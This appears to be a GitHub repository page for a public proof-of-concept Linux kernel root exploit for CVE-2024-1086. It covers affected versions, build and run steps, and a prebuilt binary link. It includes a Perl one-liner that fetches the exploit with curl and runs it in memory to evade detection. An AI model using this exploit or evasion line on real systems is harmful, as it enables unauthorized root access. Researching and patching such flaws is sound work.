
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Notselwyn%2FCVE-2024-1086)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Notselwyn](/Notselwyn)
/
**[CVE-2024-1086](/Notselwyn/CVE-2024-1086)**
Public

* [Notifications](/login?return_to=%2FNotselwyn%2FCVE-2024-1086) You must be signed in to change notification settings
* [Fork
  302](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)
* [Star
   2.3k](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)

Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

[pwning.tech/nftables](https://pwning.tech/nftables "https://pwning.tech/nftables")

### License

[MIT license](/Notselwyn/CVE-2024-1086/blob/main/LICENSE)

[2.3k
stars](/Notselwyn/CVE-2024-1086/stargazers) [302
forks](/Notselwyn/CVE-2024-1086/forks) [Branches](/Notselwyn/CVE-2024-1086/branches) [Tags](/Notselwyn/CVE-2024-1086/tags) [Activity](/Notselwyn/CVE-2024-1086/activity)
 [Star](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)

 [Notifications](/login?return_to=%2FNotselwyn%2FCVE-2024-1086) You must be signed in to change notification settings

* [Code](/Notselwyn/CVE-2024-1086)
* [Issues
  4](/Notselwyn/CVE-2024-1086/issues)
* [Pull requests
  1](/Notselwyn/CVE-2024-1086/pulls)
* [Actions](/Notselwyn/CVE-2024-1086/actions)
* [Projects
  0](/Notselwyn/CVE-2024-1086/projects)
* [Security](/Notselwyn/CVE-2024-1086/security)
* [Insights](/Notselwyn/CVE-2024-1086/pulse)

Additional navigation options

* [Code](/Notselwyn/CVE-2024-1086)
* [Issues](/Notselwyn/CVE-2024-1086/issues)
* [Pull requests](/Notselwyn/CVE-2024-1086/pulls)
* [Actions](/Notselwyn/CVE-2024-1086/actions)
* [Projects](/Notselwyn/CVE-2024-1086/projects)
* [Security](/Notselwyn/CVE-2024-1086/security)
* [Insights](/Notselwyn/CVE-2024-1086/pulse)

# Notselwyn/CVE-2024-1086

    main[Branches](/Notselwyn/CVE-2024-1086/branches)[Tags](/Notselwyn/CVE-2024-1086/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[54 Commits](/Notselwyn/CVE-2024-1086/commits/main/) | | |
| [include](/Notselwyn/CVE-2024-1086/tree/main/include "include") | | [include](/Notselwyn/CVE-2024-1086/tree/main/include "include") |  |  |
| [lib](/Notselwyn/CVE-2024-1086/tree/main/lib "lib") | | [lib](/Notselwyn/CVE-2024-1086/tree/main/lib "lib") |  |  |
| [src](/Notselwyn/CVE-2024-1086/tree/main/src "src") | | [src](/Notselwyn/CVE-2024-1086/tree/main/src "src") |  |  |
| [.gitignore](/Notselwyn/CVE-2024-1086/blob/main/.gitignore ".gitignore") | | [.gitignore](/Notselwyn/CVE-2024-1086/blob/main/.gitignore ".gitignore") |  |  |
| [LICENSE](/Notselwyn/CVE-2024-1086/blob/main/LICENSE "LICENSE") | | [LICENSE](/Notselwyn/CVE-2024-1086/blob/main/LICENSE "LICENSE") |  |  |
| [Makefile](/Notselwyn/CVE-2024-1086/blob/main/Makefile "Makefile") | | [Makefile](/Notselwyn/CVE-2024-1086/blob/main/Makefile "Makefile") |  |  |
| [README.md](/Notselwyn/CVE-2024-1086/blob/main/README.md "README.md") | | [README.md](/Notselwyn/CVE-2024-1086/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# CVE-2024-1086

Universal local privilege escalation Proof-of-Concept exploit for [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

exploit\_poc.mp4

## Blogpost / Write-up

A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the [Flipping Pages blogpost](https://pwning.tech/nftables/).

## Affected versions

The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.

**Caveats:**

* The exploit does not work on v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)
* The exploits requires user namespaces (kconfig `CONFIG_USER_NS=y`), that those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and that nf\_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.
* The exploit may be *very* unstable on systems with a lot of network activity
  + Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.
  + On test devices, please turn off WiFi adapters through BIOS.
* The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn't been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.

## Usage

### Configuration

The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in [`src/config.h`](/Notselwyn/CVE-2024-1086/blob/main/src/config.h). If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase `CONFIG_PHYS_MEM`.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.

### Building

If this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.

```
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

Binary: `CVE-2024-1086/exploit`

### Running

Running the exploit is just as trivial:

```
./exploit
```

Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:

```
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd";
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

## Disclaimer

The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.

## About

Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

[pwning.tech/nftables](https://pwning.tech/nftables "https://pwning.tech/nftables")

### Topics

[exploit](/topics/exploit "Topic: exploit")
[poc](/topics/poc "Topic: poc")
[cve](/topics/cve "Topic: cve")
[lpe](/topics/lpe "Topic: lpe")
[cve-2024-1086](/topics/cve-2024-1086 "Topic: cve-2024-1086")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/Notselwyn/CVE-2024-1086/activity)
### Stars

[**2.3k**
stars](/Notselwyn/CVE-2024-1086/stargazers)
### Watchers

[**27**
watching](/Notselwyn/CVE-2024-1086/watchers)
### Forks

[**302**
forks](/Notselwyn/CVE-2024-1086/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086&report=Notselwyn+%28user%29)

## [Releases 1](/Notselwyn/CVE-2024-1086/releases)

[x64 build (Debian/Ubuntu)
Latest

Mar 23, 2024](/Notselwyn/CVE-2024-1086/releases/tag/v1.0.0)

## [Packages 0](/users/Notselwyn/packages?repo_name=CVE-2024-1086)

No packages published

## [Contributors 2](/Notselwyn/CVE-2024-1086/graphs/contributors)

* [![@Notselwyn](https://avatars.githubusercontent.com/u/68616630?s=64&v=4)](https://github.com/Notselwyn)
  [**Notselwyn**
  Lau](https://github.com/Notselwyn)
* [![@mauke](https://avatars.githubusercontent.com/u/278465?s=64&v=4)](https://github.com/mauke)
  [**mauke**](https://github.com/mauke)

## Languages

* [C
  97.8%](/Notselwyn/CVE-2024-1086/search?l=c)
* [Batchfile
  2.0%](/Notselwyn/CVE-2024-1086/search?l=batchfile)
* Other
  0.2%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

